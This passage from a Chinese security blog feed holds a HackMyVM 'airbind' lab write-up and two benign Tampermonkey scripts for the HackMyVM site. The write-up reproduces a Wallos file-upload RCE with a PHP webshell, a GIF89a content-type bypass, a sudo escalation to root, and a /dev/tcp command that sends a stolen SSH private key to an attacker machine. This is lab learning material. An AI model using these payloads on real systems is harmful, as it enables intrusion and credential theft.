OS:%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=40%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=3F%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T
OS:=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=
OS:0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(
OS:R=Y%DFI=N%T=40%CD=S)

Network Distance: 1 hop

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.31 seconds
```

Êâ´ÊèèÁªìÊûúÊòæÁ§∫ÁõÆÊ†áÊú∫Âô®ÂºÄÊîæ‰∫Ü 22 (SSH) Âíå 80 (HTTP) Á´ØÂè£„ÄÇ

---

### **2. Web ÊúçÂä°Êé¢Êµã‰∏éWallos Êñá‰ª∂‰∏ä‰º†ÊºèÊ¥û**

ÂØπ 80 Á´ØÂè£ÊÑüÂÖ¥Ë∂£ÔºåËÆøÈóÆ Web È°µÈù¢ÔºåÊòØ‰∏™ÁôªÂΩïÁΩëÈ°µÔºåÊâ´Êèè‰∏Ä‰∏ãÁªìÊûÑ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ whatweb http://192.168.205.212/login.php
http://192.168.205.212/login.php [200 OK] Apache[2.4.57], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.57 (Ubuntu)], IP[192.168.205.212], PasswordField[password], Title[Wallos - Subscription Tracker]   
```

ÁúãÊúâÊ≤°ÊúâÊºèÊ¥û

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ searchsploit Wallos
----------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                       |  Path
----------------------------------------------------------------------------------------------------- ---------------------------------
Wallos &lt; 1.11.2 - File Upload RCE                                                                    | php/webapps/51924.txt
----------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
                         
```

ÊòØ‰∏™Êñá‰ª∂‰∏ä‰º†ÔºåË¶ÅÁôªÂΩïËøõÂéªÔºåÂ∞ùËØï‰∏Ä‰∏ãÂº±ÂØÜÁ†Å

`admin`:`admin`Â∞±Ëøô‰πàÊ∞¥ÁÅµÁÅµÁöÑËøõÂéª‰∫Ü

[exploit-db](https://www.exploit-db.com/exploits/51924)ÊÉ≥ÁúãÂéüÁâàÂà©Áî®ÁöÑÂèØ‰ª•Âú®ËøôÁúã,ÊàëÁõ¥Êé•ÊîæÁøªËØë‰∏äÊù•‰∫Ü

```bash
# ÊºèÊ¥ûÊ†áÈ¢òÔºöWallos - Êñá‰ª∂‰∏ä‰º† RCEÔºàÂ∑≤È™åËØÅÔºâ
# Êó•ÊúüÔºö2024-03-04
# ÊºèÊ¥û‰ΩúËÄÖÔºösml@lacashita.com
# ‰æõÂ∫îÂïÜ‰∏ªÈ°µÔºöhttps://github.com/ellite/Wallos
# ËΩØ‰ª∂ÈìæÊé•Ôºöhttps://github.com/ellite/Wallos
# ÁâàÊú¨Ôºö&lt; 1.11.2
# ÊµãËØïÂπ≥Âè∞ÔºöDebian 12

Wallos ÂÖÅËÆ∏ÊÇ®Âú®ÂàõÂª∫Êñ∞ËÆ¢ÈòÖÊó∂‰∏ä‰º†ÂõæÂÉè/ÂæΩÊ†á„ÄÇ

ÂèØ‰ª•ÁªïËøáÊ≠§ÊºèÊ¥ûÊù•‰∏ä‰º†ÊÅ∂ÊÑè .php Êñá‰ª∂„ÄÇ

POC
---

1) ÁôªÂΩïÂ∫îÁî®Á®ãÂ∫è„ÄÇ
2) ËΩ¨Âà∞‚ÄúÊñ∞ËÆ¢ÈòÖ‚Äù
3) ‰∏ä‰º†ÂæΩÊ†áÂπ∂ÈÄâÊã©ÊÇ®ÁöÑ webshell .php
4) ÂèëÂá∫ËØ∑Ê±ÇÔºåÂ∞Ü Content-Type Êõ¥Êîπ‰∏∫ image/jpeg Âπ∂Ê∑ªÂä†‚ÄúGIF89a‚ÄùÔºåÂÆÉÂ∫îËØ•ÊòØËøôÊ†∑ÁöÑÔºö

--- SNIP -----------------

POST /endpoints/subscription/add.php HTTP/1.1

‰∏ªÊú∫Ôºö192.168.1.44

Áî®Êà∑‰ª£ÁêÜÔºöMozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0

Êé•ÂèóÔºö*/*

Êé•ÂèóËØ≠Ë®ÄÔºöen-US,en;q=0.5

Êé•ÂèóÁºñÁ†ÅÔºögzipÔºådeflate

ÂºïÁî®Ôºöhttp://192.168.1.44/

ÂÜÖÂÆπÁ±ªÂûãÔºömultipart/form-data;ËæπÁïå=---------------------------29251442139477260933920738324

Êù•Ê∫êÔºöhttp://192.168.1.44

ÂÜÖÂÆπÈïøÂ∫¶Ôºö7220

ËøûÊé•ÔºöÂÖ≥Èó≠

CookieÔºötheme=lightÔºõlanguage=enÔºõPHPSESSID=6a3e5adc1b74b0f1870bbfceb16cda4bÔºõtheme=light

-----------------------------29251442139477260933920738324

ÂÜÖÂÆπÂ§ÑÁΩÆÔºöform-dataÔºõname='name'

ÊµãËØï

-----------------------------29251442139477260933920738324

ÂÜÖÂÆπÂ§ÑÁΩÆÔºöform-dataÔºõname='logo'Ôºõ filename='revshell.php'

Content-Type: image/jpeg

GIF89a;

&lt;?php
system($_GET['cmd']);
?&gt;

-----------------------------29251442139477260933920738324

Content-Disposition: form-data; name='logo-url'

----- SNIP -----

5) ÊÇ®Â∞ÜÊî∂Âà∞Êñá‰ª∂Â∑≤ÊàêÂäü‰∏ä‰º†ÁöÑÂìçÂ∫îÔºö

{'status':'Success','message':'Subscription updated successful'}

6) ÊÇ®ÁöÑÊñá‰ª∂Â∞Ü‰Ωç‰∫éÔºö
http://VICTIM_IP/images/uploads/logos/XXXXXX-yourshell.php
```

ÊÄªÁªì‰∏Ä‰∏ãÂ∞±ÊòØÁªèÂÖ∏ÁöÑgif‰º™Ë£ÖÔºåÊää‰∏ãÈù¢ÂÜÖÂÆπÂÅö‰∏™`revshell.php.png`‰º†‰∏äÂéªÔºåÊãøburpÊã¶‰∏Ä‰∏ãÂà†Èô§`.png`ÂêéÁºÄÂ∞±ÂèØ‰ª•‰∫ÜÔºàÁõ¥Êé•‰º†‰∏ç‰∏ÄÂÆöË°åÔºå‰Ω†‰ª¨ÂèØ‰ª•ËØïËØïÔºâ

```bash
GIF89a;

&lt;?php
system($_GET['cmd']);
?&gt;
```

‰º†‰∏äÂéªÊâìÂºÄ`http://192.168.205.212/images/uploads/logos/`Â∞±ÂèØ‰ª•ÁúãÂà∞‰∫Ü

![image](https://github.com/user-attachments/assets/509e49e8-17f9-46f4-b10e-7cba613d11db)

`http://192.168.205.212/images/uploads/logos/1735465582-1.php?cmd=id`Â∞±‰ºöÂèëÁé∞ÊâßË°åÊàêÂäüÔºåÂª∫ËÆÆ‰º†‰∏™sh‰∏äÂéªÊãøshellÔºåÊàëËØï‰∫Ü2‰∏™ÂèçÂºπÈÉΩÂºπ‰∏çÂõûÊù•

### 3.**Ëé∑ÂæóÁ®≥ÂÆö shell**

Ëé∑Âæó‰∫§‰∫íÂºè TTY shellÔºö

```bash
script /dev/null -c bash  
ctrl+z  
stty raw -echo; fg  
reset xterm  
export TERM=xterm  
echo $SHELL  
export SHELL=/bin/bash  
stty rows 59 cols 236
```

### 4.**ÊèêÊùÉ**

‰∏äÂà∞Âéª`sudo -l`ÊúâÊÉäÂñú

```bash
www-data@ubuntu:/home$ sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User www-data may run the following commands on ubuntu:
    (ALL) NOPASSWD: ALL

```

ÊâßË°å‰ªªÊÑèÂëΩ‰ª§

```bash
www-data@ubuntu:/home$ sudo bash -p
root@ubuntu:/home# id
uid=0(root) gid=0(root) groups=0(root)
```

ÂΩìÁÑ∂ÂΩì‰Ω†ÊâìÂºÄ`/root/`ÁõÆÂΩïÔºå‰Ω†Â∞±‰ºöÁúãÂà∞Âè™Êúâ`user.txt`ÔºåÊâÄ‰ª•Ëøô‰∏™Â∫îËØ•ÊòØ‰∏Ä‰∏™ÂÆπÂô®

```bash
root@ubuntu:/home/ubuntu# hostname -I
10.0.3.241 
```

Á°ÆÂÆûÊòØÂÆπÂô®ÔºåÂú®ÁõÆÂΩï‰∏ãËøòÁúãÂà∞‰∏Ä‰∏™`.ssh`ÁöÑÁôªÂΩïÂØÜÈí•,ÊãøËøáÂéªÊàë‰ª¨ÈÇ£ÊµãËØïÁôªÂΩïÁúüÊú∫

```bash
#ÂÆπÂô®
root@ubuntu:~/.ssh# cat id_rsa &gt; /dev/tcp/192.168.205.141/7777
#ÊîªÂáªÊú∫
nc -lvnp 7777 &gt; id_rsa
```

ÊµãËØïÁôªÂΩïipv4Áôª‰∏ç‰∏äÔºå‰ªñÊääÁ´ØÂè£ÂÖ≥‰∫ÜÔºàÂèØ‰ª•ÁúãÊúÄÂâçÈù¢ÁöÑÊâ´ÊèèÁªìÊûúÔºâÔºåÈÇ£Êàë‰ª¨Â∞±ËøûÊé•ipv6

```bash
‚îî‚îÄ$ ping6 -I eth0 ff02::1
ping6: Warning: source address might be selected on device other than: eth0
PING ff02::1 (ff02::1) from :: eth0: 56 data bytes
64 bytes from fe80::4e47:7084:75d9:9c4%eth0: icmp_seq=1 ttl=64 time=0.148 ms
64 bytes from fe80::a00:27ff:fead:e1d7%eth0: icmp_seq=1 ttl=64 time=0.823 ms
64 bytes from fe80::4e47:7084:75d9:9c4%eth0: icmp_seq=2 ttl=64 time=0.055 ms
64 bytes from fe80::a00:27ff:fead:e1d7%eth0: icmp_seq=2 ttl=64 time=0.537 ms
64 bytes from fe80::4e47:7084:75d9:9c4%eth0: icmp_seq=3 ttl=64 time=0.047 ms
64 bytes from fe80::a00:27ff:fead:e1d7%eth0: icmp_seq=3 ttl=64 time=0.493 ms
64 bytes from fe80::4e47:7084:75d9:9c4%eth0: icmp_seq=4 ttl=64 time=0.038 ms
64 bytes from fe80::a00:27ff:fead:e1d7%eth0: icmp_seq=4 ttl=64 time=0.350 ms
64 bytes from fe80::4e47:7084:75d9:9c4%eth0: icmp_seq=5 ttl=64 time=0.041 ms
64 bytes from fe80::a00:27ff:fead:e1d7%eth0: icmp_seq=5 ttl=64 time=0.349 ms
64 bytes from fe80::4e47:7084:75d9:9c4%eth0: icmp_seq=6 ttl=64 time=0.035 ms
64 bytes from fe80::a00:27ff:fead:e1d7%eth0: icmp_seq=6 ttl=64 time=0.332 ms
^C
--- ff02::1 ping statistics ---
6 packets transmitted, 6 received, +6 duplicates, 0% packet loss, time 5116ms
rtt min/avg/max/mdev = 0.035/0.270/0.823/0.244 ms
                                                                                  
```

ÂèëÂπøÊí≠ÁúãÁúãË∞ÅÂú®Á∫øÔºåÁÑ∂Âêé‰∏Ä‰∏™‰∏™ËØïÂ∞±Â•Ω‰∫ÜÔºàÊ°•Êé•ÁúüÂÆûÁΩëÂç°Âà´Ëøô‰πàËøûÔºåÂª∫ËÆÆÊääÊ°•Êé•Êç¢ÊàêNATÊ®°ÂºèÂÜçÂ∞ùËØïÔºâ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ ssh -i id_rsa root@fe80::a00:27ff:fead:e1d7%eth0
Linux airbind 6.1.0-18-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.76-1 (2024-02-01) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
root@airbind:~# id
uid=0(root) gid=0(root) groupes=0(root)
```sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_airbind.html</guid><pubDate>Fri, 27 Jun 2025 09:32:26 +0000</pubDate></item><item><title>HackMyVM Ê≤πÁå¥ËæÖÂä©ËÑöÊú¨</title><link>https://7r1UMPHK.github.io/post/HackMyVM%20-you-hou-fu-zhu-jiao-ben.html</link><description>## 1. Ëµ∑Âõ† ü§î

ÊúÄËøëÈÄõÊàëÂçöÂÆ¢ÁöÑÊñ∞ÊúãÂèãÂ•ΩÂÉèÂ§ö‰∫ÜËµ∑Êù•Ôºå‰∏çÂ∞ë‰∫∫Ë¢´ÂÆâÂà©ÂéªÁé© **HackMyVM** ‰∫Ü„ÄÇ‰∏çËøáÔºåÂàö‰∏äÊâãÂèØËÉΩ‰ºöÈÅáÂà∞‰∫õÂ∞èÈ∫ªÁÉ¶„ÄÇ

ÊØîÂ¶ÇÊàëËá™Â∑±Áé©ÁöÑÊó∂ÂÄôÔºåÂ∞±ÁªèÂ∏∏Âõ†‰∏∫ÂèëÂëÜÂ§™‰πÖÔºàÊàñËÄÖÊü•ËµÑÊñôÊó∂Èó¥Èïø‰∫ÜÁÇπÔºâÂØºËá¥‰ºöËØùË∂ÖÊó∂ÔºåÊØèÊ¨°ÈÉΩÂæóÈáçÊñ∞ÁôªÂΩïÔºå**Êå∫ÁÉ¶‰∫∫ÁöÑ**„ÄÇËøòÊúâÔºåÊâì Challenge ÁöÑÊó∂ÂÄôÔºåÊØèÊ¨°Êèê‰∫§ÂÆå Flag ÈÉΩÂæó**ÊâãÂä®ÂéªÊîπ URL Ë∑≥Âà∞‰∏ã‰∏Ä‰∏™**ÔºåÁÇπÂá†‰∏ã‰πüÊòØÊúâÁÇπÂ∞è‰∏çÁàΩ„ÄÇ

‰∏∫‰∫ÜËß£ÂÜ≥Ëøô‰∏§‰∏™ÁóõÁÇπÔºåÊàëÂà©Áî® AI Êç£Èºì‰∫Ü‰∏Ä‰∏™Ê≤πÁå¥ËÑöÊú¨Ôºå‰πüÂ§çÂà∂ÁªôÂ§ßÂÆ∂ Todd Â§ß‰Ω¨ÁöÑ‰∏Ä‰∏™ËÑöÊú¨ÔºåÂ∏åÊúõËÉΩËÆ©Â§ßÂÆ∂ÁöÑ HackMyVM ‰ΩìÈ™å**Êõ¥ËàíÊúç‰∏ÄÁÇπ**„ÄÇüëç

---

## 2. ËÑöÊú¨‰∏ÄÔºö‰øùÊåÅÂú®Á∫ø‰∏çÊéâÁ∫ø‚è≥

### 2.1. ÂÆÉËÉΩÂπ≤Âï•Ôºü

Ëøô‰∏™ËÑöÊú¨‰∏ªË¶ÅÂ∞±ÊòØ‰∏∫‰∫ÜÈò≤Ê≠¢‰Ω†Âõ†‰∏∫ÈïøÊó∂Èó¥Ê≤°Âú® HackMyVM È°µÈù¢‰∏äÊìç‰ΩúËÄåË¢´Âº∫Âà∂Ë∏¢‰∏ãÁ∫ø„ÄÇÂÆÉ‰ºö**ÊÇÑÊÇÑÂú∞Âú®ÂêéÂè∞Â∏Æ‰Ω†Ëá™Âä®Âà∑Êñ∞È°µÈù¢**ÔºåËøôÊ†∑‰Ω†Â∞±ÂèØ‰ª•ÂÆâÂøÉÂú∞Êü•ËµÑÊñô„ÄÅÂÜôÁ¨îËÆ∞ÊàñËÄÖÊöÇÊó∂Á¶ªÂºÄ‰∏Ä‰∏ãÔºå‰∏çÁî®ÊãÖÂøÉÂõûÊù•ÂèàË¶ÅÈáçÊñ∞ÁôªÂΩï‰∫Ü„ÄÇ

### 2.2. ÂÆÉÊòØÊÄé‰πàÂ∑•‰ΩúÁöÑÔºü

```javascript
// ==UserScript==
// @name         ‰øùÊåÅhackmyvmÁöÑÁôªÂΩïÁä∂ÊÄÅ
// @namespace    http://tampermonkey.net/
// @version      2.0
// @description  ÂÆöÊó∂Âà∑Êñ∞È°µÈù¢Ôºå‰øùÊåÅÁôªÂΩïÁä∂ÊÄÅÔºåÁõÆÂâç 5 ÂàÜÈíü
// @require
// @author       Todd
// @match        https://hackmyvm.eu/*
// @grant        none
// ==/UserScript==

(function () {
  'use strict';
  // ËÆæÁΩÆ‰∏Ä‰∏™ÂÆöÊó∂Âô®ÔºåÊØèÈöî 5 ÂàÜÈíüÔºà300,000 ÊØ´ÁßíÔºâÂ∞±ËÆ©ÂÆÉÂπ≤ÁÇπ‰∫ã
  setInterval(() =&gt; {
    // Âπ≤ÁöÑ‰∫ãÂ∞±ÊòØÔºöÂà∑Êñ∞‰∏Ä‰∏ãÂΩìÂâçÈ°µÈù¢
    location.reload();
  }, 1000 * 60 * 5); // 1Áßí * 60 * 5 = 5ÂàÜÈíü
})();
```

*   `@match https://hackmyvm.eu/*`: ËøôË°åÊòØÂëäËØâÊ≤πÁå¥ÔºàTampermonkeyÔºâÔºåËøô‰∏™ËÑöÊú¨Âè™Âú® HackMyVM ÁΩëÁ´ô (`https://hackmyvm.eu/`) ‰∏ãÁöÑÊâÄÊúâÈ°µÈù¢ÁîüÊïà„ÄÇ
*   `setInterval(() =&gt; location.reload(), 1000 * 60 * 5);`: ËøôÊòØËÑöÊú¨ÁöÑÊ†∏ÂøÉ„ÄÇ`setInterval` ‰ºöËÆ©ÊµèËßàÂô®**ÊØèÈöî 5 ÂàÜÈíü**Â∞±ÊâßË°å‰∏ÄÊ¨° `location.reload()` Ëøô‰∏™ÂëΩ‰ª§Ôºå‰πüÂ∞±ÊòØÂà∑Êñ∞ÂΩìÂâçÈ°µÈù¢ÔºåÊ®°Êãü‰Ω†ËøòÂú®Ê¥ªË∑ÉÁä∂ÊÄÅÔºå‰ªéËÄå‰øùÊåÅÁôªÂΩï„ÄÇ

### 2.3. Ë∞ÅÂÜôÁöÑÔºü

Ëøô‰∏™ËÑöÊú¨ÊòØ **Todd** Â§ß‰Ω¨ÂÜôÁöÑ„ÄÇËÜúÊãúÂ§ß‰Ω¨ÔºÅorz

&gt; **P.S.** Â¶ÇÊûúÊÉ≥Âéª Todd Â§ß‰Ω¨ÁöÑÂçöÂÆ¢ÁúãÁúãÔºåÂèØ‰ª•ÁÇπÂáª[**ËøôÈáå**](https://blog.findtodd.com/)ÔºåÊàñËÄÖÂéªÊàëÁöÑÂèãÈìæÈ°µÈù¢‰πüËÉΩÊâæÂà∞Ë∑≥ËΩ¨ÈìæÊé•„ÄÇ

### 2.4. ‰ªÄ‰πàÊÉÖÂÜµ‰∏ãÁî®ÊØîËæÉÂ•ΩÔºü

**Âº∫ÁÉàÊé®Ëçê**ÁªôÈúÄË¶ÅÂú® HackMyVM ‰∏äÊü•ËµÑÊñô„ÄÅÂÜô WriteupÔºåÊàñËÄÖÂè™ÊòØÊåÇÁùÄÈ°µÈù¢ÊÄùËÄÉËß£È¢òÊÄùË∑ØÁöÑÊúãÂèã‰ª¨„ÄÇÊúâ‰∫ÜÂÆÉÔºåÈ∫ªÈ∫ªÂÜç‰πü‰∏çÁî®ÊãÖÂøÉÔºåÊàëÂä®‰∏çÂä®Â∞±ÂæóÈáçÊñ∞ÁôªÂΩï‰∫ÜÔºåÂ∞±ÁÆó‰Ω†ÊöÇÊó∂Á¶ªÂºÄÁîµËÑë‰∏Ä‰ºöÂÑøÔºå‰πüËÉΩÂ∏Æ‰Ω†‰øù‰ΩèÁôªÂΩïÁä∂ÊÄÅ„ÄÇ

---

## 3. ËÑöÊú¨‰∫åÔºöÊåëÊàòÂÖ≥Âç°Âø´ÈÄüË∑≥ËΩ¨üöÄ

### 3.1. ÂÆÉËÉΩÂπ≤Âï•Ôºü

Êâì Challenge Êó∂ÊòØ‰∏çÊòØËßâÂæóÊØèÊ¨°ËæìÂÆå Flag ÈÉΩË¶ÅÊâãÂä®Êîπ URL Âéª‰∏ã‰∏Ä‰∏™ÊúâÁÇπÁÉ¶ÔºüËøô‰∏™ËÑöÊú¨Â∞±ÊòØÊù•Ëß£ÂÜ≥Ëøô‰∏™ÈóÆÈ¢òÁöÑÔºÅ

ÂÆÉÁªô HackMyVM ÁöÑÊåëÊàòÈ°µÈù¢ (`challenge.php`) Âä†‰∫Ü‰∏™Âø´Êç∑Êìç‰ΩúÔºö‰Ω†ÂèØ‰ª•Áõ¥Êé• **ÊåâÈº†Ê†á‰æßÈîÆ**ÔºàÈÄöÂ∏∏ÊòØ‚ÄúÂâçËøõ‚ÄùÈÇ£‰∏™ÊåâÈíÆÔºå‰∏ÄËà¨ÊòØ `Button 4`ÔºâÊàñËÄÖ**ÈîÆÁõòÁöÑÂè≥ÁÆ≠Â§¥ `‚Üí`**ÔºåËÑöÊú¨Â∞±‰ºöËá™Âä®Â∏Æ‰Ω†Ë∑≥ËΩ¨Âà∞‰∏ã‰∏Ä‰∏™ Challenge È°µÈù¢Ôºå**ÁúÅ‰∫ãÂ§ö‰∫Ü**ÔºÅ

### 3.2. ÂÆÉÊòØÊÄé‰πàÂ∑•‰ΩúÁöÑÔºü

```javascript
// ==UserScript==
// @name         HackMyVMÊåëÊàòÈ°µÈù¢Âø´ÈÄüÂØºËà™
// @namespace    http://tampermonkey.net/
// @version      0.1
// @description  ‰ΩøÁî®Èº†Ê†á‰æß‰∏äÈîÆÊàñÂè≥ÁÆ≠Â§¥Âø´ÈÄüÂØºËà™Âà∞‰∏ã‰∏Ä‰∏™ÊåëÊàòÈ°µÈù¢
// @author       AI &amp; YourName (Modify)
// @match        https://hackmyvm.eu/challenges/challenge.php?c=*
// @grant        none
// ==/UserScript==

(function() {
    'use strict';

    // Â∞ÅË£Ö‰∏Ä‰∏™Ë∑≥ËΩ¨Âà∞‰∏ã‰∏ÄÂÖ≥ÁöÑÂä®‰Ωú
    function navigateToNextChallenge() {
        const currentUrl = window.location.href; // Ëé∑ÂèñÂΩìÂâçÈ°µÈù¢ÁöÑÁΩëÂùÄ
        // Áî®Ê≠£ÂàôË°®ËææÂºèÊäìÂèñÁΩëÂùÄÈáå c= ÂêéÈù¢ÁöÑÊï∞Â≠ó (ÊåëÊàòÁºñÂè∑)
        const challengeMatch = currentUrl.match(/c=(\d+)/);

        if (challengeMatch &amp;&amp; challengeMatch[1]) { // Á°Æ‰øùÊäìÂà∞‰∫ÜÁºñÂè∑
            // ÊääÊäìÂà∞ÁöÑÁºñÂè∑Â≠óÁ¨¶‰∏≤ËΩ¨ÊàêÊï∞Â≠ó
            const currentChallenge = parseInt(challengeMatch[1], 10);
            // ËÆ°ÁÆó‰∏ã‰∏Ä‰∏™ÊåëÊàòÁöÑÁºñÂè∑
            const nextChallenge = currentChallenge + 1;
            // HackMyVM ÁöÑÁºñÂè∑ÈÄöÂ∏∏ÊòØ‰∏â‰ΩçÊï∞ (Â¶Ç 001, 019)ÔºåÊâÄ‰ª•Ê†ºÂºèÂåñ‰∏Ä‰∏ãÔºå‰∏çÂ§ü‰∏â‰ΩçÂâçÈù¢Ë°• 0
            const formattedNextChallenge = String(nextChallenge).padStart(3, '0');
            // ÊääÂΩìÂâçÁΩëÂùÄÈáåÁöÑ 'c=ÊóßÁºñÂè∑' ÊõøÊç¢Êàê 'c=Êñ∞ÁºñÂè∑'ÔºåÂæóÂà∞Êñ∞ÁΩëÂùÄ
            const newUrl = currentUrl.replace(/c=\d+/, 'c=' + formattedNextChallenge);
            // Ë∑≥ËΩ¨Âà∞Êñ∞ÁΩëÂùÄ
            window.location.href = newUrl;
        }
    }

    // ÁõëÂê¨Èº†Ê†áÊåâÈîÆÊä¨Ëµ∑‰∫ã‰ª∂
    document.addEventListener('mouseup', function(event) {
        // Ê£ÄÊü•ÊòØ‰∏çÊòØÈº†Ê†á‰æßÈîÆÔºàÂâçËøõÈîÆÔºåÊåâÈíÆÁºñÂè∑ÈÄöÂ∏∏ÊòØ 4Ôºâ
        if (event.button === 4) { // button 4 ÈÄöÂ∏∏ÊòØ‰æßÂâçÈîÆ
            navigateToNextChallenge(); // ÊòØÁöÑËØùÔºåÂ∞±ÊâßË°åË∑≥ËΩ¨
        }
    });

    // ÁõëÂê¨ÈîÆÁõòÊåâÈîÆÊåâ‰∏ã‰∫ã‰ª∂
    document.addEventListener('keydown', function(event) {
        // Ê£ÄÊü•ÊòØ‰∏çÊòØÊåâ‰∫ÜÂè≥ÁÆ≠Â§¥ÈîÆ
        if (event.key === 'ArrowRight') {
            navigateToNextChallenge(); // ÊòØÁöÑËØùÔºå‰πüÊâßË°åË∑≥ËΩ¨
        }
    });

})();
```

*   `@match https://hackmyvm.eu/challenges/challenge.php?c=*`: Ëøô‰∏™ËÑöÊú¨‰∏ìÈó®ÈíàÂØπ**ÊåëÊàòÈ°µÈù¢**ÔºåÊâÄ‰ª•Âè™Âú®ÁΩëÂùÄÂåπÈÖçËøô‰∏™Ê®°Âºè (`challenge.php` ÂêéÈù¢Ë∑üÁùÄ `?c=`) ÁöÑÊó∂ÂÄôËøêË°å„ÄÇ
*   `navigateToNextChallenge()`: ËøôÊòØÊ†∏ÂøÉÁöÑË∑≥ËΩ¨ÈÄªËæëÂáΩÊï∞„ÄÇÂÆÉ‰ºöÔºö
    1.  ÊãøÂà∞‰Ω†ÂΩìÂâçÊâÄÂú®ÊåëÊàòÈ°µÈù¢ÁöÑ URL„ÄÇ
    2.  Áî®**Ê≠£ÂàôË°®ËææÂºè**‰ªé URL ÈáåÊääÊåëÊàòÁºñÂè∑ÔºàÊØîÂ¶Ç `c=005` ÈáåÁöÑ `005`ÔºâÊä†Âá∫Êù•„ÄÇ
    3.  ÊääÁºñÂè∑Âä† 1ÔºåÂæóÂà∞‰∏ã‰∏Ä‰∏™ÊåëÊàòÁöÑÁºñÂè∑„ÄÇ
    4.  **ÁâπÂà´Â§ÑÁêÜ**ÔºöÂõ†‰∏∫ HackMyVM ÁöÑÁºñÂè∑ÂñúÊ¨¢Áî®**‰∏â‰ΩçÊï∞**ÔºàÂÉè `001`, `020` ËøôÁßçÔºâÔºåÊâÄ‰ª•ËÑöÊú¨‰ºöÊääÊñ∞ÁöÑÁºñÂè∑‰πü**Ê†ºÂºèÂåñÊàê‰∏â‰ΩçÊï∞**ÔºàÊØîÂ¶Ç `6` ‰ºöÂèòÊàê `006`ÔºâÔºå‰∏çË∂≥‰∏â‰ΩçÂâçÈù¢Ë°• `0`„ÄÇ
    5.  ÊúÄÂêéÔºåÁîüÊàê‰∏Ä‰∏™Êñ∞ÁöÑ URLÔºàÊääÊóßÁºñÂè∑ÊõøÊç¢ÊàêÊñ∞ÁºñÂè∑ÔºâÔºåÁÑ∂ÂêéËÆ©ÊµèËßàÂô®Ë∑≥ËΩ¨ËøáÂéª„ÄÇ
*   `addEventListener('mouseup', ...)`: ËøôÈÉ®ÂàÜÊòØ**ÁõëÂê¨Èº†Ê†áÊåâÈîÆÊä¨Ëµ∑**ÁöÑÂä®‰Ωú„ÄÇÂ¶ÇÊûúÊùæÂºÄÁöÑÊòØÈº†Ê†á‰æßÂâçÈîÆÔºà`event.button === 4`ÔºâÔºåÂ∞±Ë∞ÉÁî®‰∏äÈù¢ÁöÑË∑≥ËΩ¨ÂáΩÊï∞„ÄÇ
*   `addEventListener('keydown', ...)`: ËøôÈÉ®ÂàÜÊòØ**ÁõëÂê¨ÈîÆÁõòÊåâÈîÆÊåâ‰∏ã**ÁöÑÂä®‰Ωú„ÄÇÂ¶ÇÊûúÊåâÁöÑÊòØÂè≥ÁÆ≠Â§¥Ôºà`event.key === 'ArrowRight'`ÔºâÔºå‰πüË∞ÉÁî®Ë∑≥ËΩ¨ÂáΩÊï∞„ÄÇ

### 3.3. Ë∞ÅÂÜôÁöÑÔºü

Ëøô‰∏™ËÑöÊú¨‰∏ªË¶ÅÊòØ **AI** ÁºñÂÜôÁöÑ„ÄÇÔºàÊàëÂ∞±Ëµ∑Âà∞‰∫Ü‰∏Ä‰∏™ `Ctrl+C` / `Ctrl+V` üòâÔºâ„ÄÇ

### 3.4. ‰ªÄ‰πàÊÉÖÂÜµ‰∏ãÁî®ÊØîËæÉÂ•ΩÔºü

Â¶ÇÊûú‰Ω†ÂñúÊ¨¢**ÊåâÈ°∫Â∫èÂà∑ HackMyVM ÁöÑ Challenge**ÔºåËøô‰∏™ËÑöÊú¨ÁªùÂØπÊòØÊèêÂçáÊïàÁéáÁöÑÁ•ûÂô®ÔºÅÂÆÉËÉΩÂ∏Æ‰Ω†ÁúÅ‰∏ã‰∏çÂ∞ëÁÇπÂáªÂíå‰øÆÊîπ URL ÁöÑÊó∂Èó¥ÔºåËÆ©Âà∑È¢òËøáÁ®ã**Êõ¥ÊµÅÁïÖ**„ÄÅ**‰ΩìÈ™åÊõ¥Â•Ω**„ÄÇ
sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/HackMyVM%20-you-hou-fu-zhu-jiao-ben.html</guid><pubDate>Fri, 27 Jun 2025 09:32:23 +0000</pubDate></item><item><title>eNSP Âú® Windows 11 24H2 ‰∏äÁöÑÂÖºÂÆπÊÄßÈóÆÈ¢òÂ∑≤ÈÄöËøá KB5053656 Êõ¥Êñ∞Ëß£ÂÜ≥</title><link>https://7r1UMPHK.github.io/post/eNSP%20-zai-%20Windows%2011%2024H2%20-shang-de-jian-rong-xing-wen-ti-yi-tong-guo-%20KB5053656%20-geng-xin-jie-jue.html</link><description>## ÈóÆÈ¢òËÉåÊôØ

